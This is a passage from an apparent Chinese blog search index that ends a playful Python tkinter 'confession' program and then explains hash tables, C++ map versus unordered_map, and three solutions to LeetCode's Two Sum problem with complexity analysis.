operator">=</span><span class="token string">"./表白图标.png"</span><span class="token punctuation">)</span>imageLable<span class="token operator">=</span>Label<span class="token punctuation">(</span>window<span class="token punctuation">,</span>image <span class="token operator">=</span> photo <span class="token punctuation">)</span>imageLable<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>columnspan <span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#按钮控件</span>btn <span class="token operator">=</span> Button <span class="token punctuation">(</span>window<span class="token punctuation">,</span>text <span class="token operator">=</span><span class="token string">"喜欢"</span><span class="token punctuation">,</span>width <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">,</span>heigh <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>command <span class="token operator">=</span> Love<span class="token punctuation">)</span>btn<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row <span class="token operator">=</span><span class="token number">3</span> <span class="token punctuation">,</span>column <span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">,</span>sticky <span class="token operator">=</span> W <span class="token punctuation">)</span>btn1<span class="token operator">=</span>Button <span class="token punctuation">(</span>window<span class="token punctuation">,</span>text <span class="token operator">=</span><span class="token string">"不喜欢"</span><span class="token punctuation">,</span>command <span class="token operator">=</span>nolove<span class="token punctuation">)</span>btn1<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sticky <span class="token operator">=</span> E<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># file=r'D:\Graduation project\untitled5\love.mp3'</span><span class="token comment" spellcheck="true"># pygame.mixer.init()</span><span class="token comment" spellcheck="true"># track=pygame.mixer.music.load(file)</span><span class="token comment" spellcheck="true"># pygame.mixer.music.play()</span><span class="token comment" spellcheck="true">#显示窗口  消息循环</span>window <span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200709121440737.PNG#pic_center" alt="男女协调，人人成家！"><br>如果对大家有帮助，或者博得了女朋友一笑，大家可以打赏我哦！<br><label style="color:green">最后助大家早日脱单！</label></p>]]></content>
      
      
      <categories>
          
          <category> 那些花里胡哨的代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 表白程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是hash表呢？</title>
      <link href="/2020/07/07/hashtable/"/>
      <url>/2020/07/07/hashtable/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ha-xi-biao">哈希表！？</span></h1><pre><code>大家在第一次听到哈希表的时候，会怎么去想这个东西呢？反正我是觉得挺神秘的！一定是个很厉害的算法，其实不是，是一个很菜鸟的算法！有多菜呢？我都看得懂！哈哈哈，那我们就来一起看看什么是哈希表吧！</code></pre><h2><span id="ha-xi-biao-jian-shu">哈希表简述</span></h2><pre><code>散列表（Hash table，也叫哈希表），是根据关键码值(Key value)而直接进行访问的数据结构。也就是说，它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。这个映射函数叫做散列函数，存放记录的数组叫做散列表。给定表M，存在函数f(key)，对任意给定的关键字值key，代入函数后若能得到包含该关键字的记录在表中的地址，则称表M为哈希(Hash）表，函数f(key)为哈希(Hash) 函数。</code></pre><p><label style="color:red"><strong>用自己的话来说</strong></label>    <strong>我们给数据找个代号，然后直接用代号来访问这个数据，这个算法就对应了c++里面的map和unordered_map</strong></p><h2><span id="map-he-unordered-map-de-qu-bie">map和unordered_map的区别</span></h2><h3><span id="yin-ru-tou-wen-jian-bu-tong">引入头文件不同</span></h3><table><thead><tr><th>类别</th><th>头文件</th></tr></thead><tbody><tr><td>map</td><td>#include &lt; map &gt;</td></tr><tr><td>unordered_map</td><td>#include &lt; unordered_map &gt;</td></tr></tbody></table><h3><span id="shi-xian-ji-zhi-bu-tong">实现机制不同</span></h3><table><thead><tr><th>类别</th><th>实现机制</th></tr></thead><tbody><tr><td>map</td><td>红黑树</td></tr><tr><td>unordered_map</td><td>hash表</td></tr></tbody></table><h3><span id="you-que-dian-bi-jiao">优缺点比较</span></h3><table><thead><tr><th>类别</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>map</td><td>有序性，简化操作</td><td>空间占用率高</td></tr><tr><td>unordered_map</td><td>内部哈希表，查找快</td><td>建立比较耗费时间</td></tr></tbody></table><h2><span id="liang-shu-zhi-he-leetcode-cong-ti-mu-ren-shi-ha-xi">两数之和（leetcode）从题目认识哈希</span></h2><h3><span id="ti-mu-chan-shu">题目阐述</span></h3><p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。<br>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。<br>示例:</p><pre><code>给定 nums = [2, 7, 11, 15],target = 9因为 nums[0] + nums[1] = 2 + 7 =9所以返回 [0, 1]</code></pre><h3><span id="bao-li-po-jie">暴力破解</span></h3><p><del>夏天虽热，也要注意保暖，不要感冒，多喝烫水，先来一手直男破解</del></p><p>大力出奇迹，冲鸭！爆破开始！</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token punctuation">:</span>    vector<span class="token operator">&lt;</span>int<span class="token operator">></span><span class="token function">twoSum</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>int<span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> int target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    int len<span class="token operator">=</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>int i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token number">-1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>int j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token punctuation">{</span>i<span class="token punctuation">,</span>j<span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>       <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3><span id="liang-ci-ha-xi">两次哈希</span></h3><p>对于第一种暴力破解，相当于遍历了所有的两数之和的情况，如果满足就输入，这是很浪费时间的。<br>我们使用哈希来优化：<br>1.unordered_map内部显示机制是hash表，更贴合算法，我们使用unordered_map<br>2.<br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200708122710419.jpg#pic_center" alt="让我们一起来看一下算法流程图吧!"></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token punctuation">:</span>    vector<span class="token operator">&lt;</span>int<span class="token operator">></span><span class="token function">twoSum</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>int<span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> int target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        unordered_map<span class="token operator">&lt;</span>int<span class="token punctuation">,</span>int<span class="token operator">></span> m<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>int i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            m<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//向map中添加元素</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>int i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span>m<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> m<span class="token punctuation">[</span>target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span> i<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">//如果m中存在对应的键值，并且不为i</span>                <span class="token keyword">return</span> <span class="token punctuation">{</span>i <span class="token punctuation">,</span> m<span class="token punctuation">[</span>target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3><span id="yi-ci-ha-xi">一次哈希</span></h3><p>和两次哈希不同的是，在压入的同时完成了查询。<br>那这样会不会漏掉情况呢？是不会的！<br>就好比力的作用是相互的，后面出现了能和前面匹配的数据，前面没找到后面，但是后面可以找到前面的数字。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token punctuation">:</span>    vector<span class="token operator">&lt;</span>int<span class="token operator">></span><span class="token function">twoSum</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>int<span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> int target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        unordered_map<span class="token operator">&lt;</span>int<span class="token punctuation">,</span>int<span class="token operator">></span> m<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>int i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span>m<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//m中存在对应的键值</span>                <span class="token keyword">return</span> <span class="token punctuation">{</span>m<span class="token punctuation">[</span>target<span class="token operator">-</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">,</span>i<span class="token punctuation">}</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//m[target-nums[i]]为已经加入map的元素的索引，所以小于本轮循环中的i，放在前面</span>            m<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//向map中添加元素</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3><span id="san-chong-jie-fa-de-shi-jian-kong-jian-fu-za-du-bi-jiao">三种解法的时间空间复杂度比较</span></h3><h4><span id="shi-me-shi-shi-jian-fu-za-du">什么是时间复杂度？</span></h4><p><label style="color:red"><strong>时间复杂度</strong></label>：<strong>时间复杂度的计算并不是计算程序集体运行的时间，二十算法执行语句的次数</strong></p><h4><span id="shi-me-shi-kong-jian-fu-za-du">什么是空间复杂度？</span></h4><p><label style="color:red"><strong>空间复杂度</strong></label>：<strong>空间复杂度是对一个算法在运行过程中临时占用储存空间大小的量度</strong></p><h4><span id="san-chong-jie-fa-fu-za-du-fen-xi">三种解法复杂度分析</span></h4><p><label style="color:red"><strong>暴力破解</strong></label>：<br>时间复杂度：O(n^2)<br>两层for循环，对于每个元素，耗费O(n)的时间，所以时间复杂度为O(n^2)<br>空间复杂度：O(1)<br><label style="color:red"><strong>二次哈希</strong></label>：<br>时间复杂度：O(n)<br>我们把包含有n个元素的列表遍历两次，由于哈希表将查找时间缩短到O(1)，所以时间复杂度为O(n)<br>空间复杂度：O(n)<br>所需的额外空间取决与哈希表中存储的元素数据，该表中存储了n个元素<br><label style="color:red"><strong>一次哈希</strong></label>：<br>时间复杂度：O(n)<br>我们把包含有n个元素的列表遍历一次，由于哈希表将查找时间缩短到O(1)，所以时间复杂度为O(n)<br>空间复杂度：O(n)<br>所需的额外空间取决与哈希表中存储的元素数据，该表最多需要存储n个元素</p><table><thead><tr><th>算法</th><th>时间复杂度</th><th>空间复杂度</th></tr></thead><tbody><tr><td>暴力破解</td><td>O(n^2)</td><td>O(1)</td></tr><tr><td>二次哈希</td><td>O(n)</td><td>O(n)</td></tr><tr><td>一次哈希</td><td>O(n)</td><td>O(n)</td></tr></tbody></table><h3><span id="yu-dao-de-wen-ti">遇到的问题</span></h3><p>在开始提交的时候没有通过所有样例<br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200516170623441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70" alt="差不多只能拿到一半的分"></p><p>原因是没有添加判断，<label style="color:red"><strong>m.find(target-nums[i]) !=m.end()</strong></label><br>引用具有指定键的元素的位置的迭代器，如果找不到具有键的匹配项，则引用映射中最后一个元素后面的位置。<br>即m.end()，我们需要判断是否查询到值。</p>]]></content>
      
      
      <categories>
          
          <category> 算法之从入门到放弃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> 哈希表 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
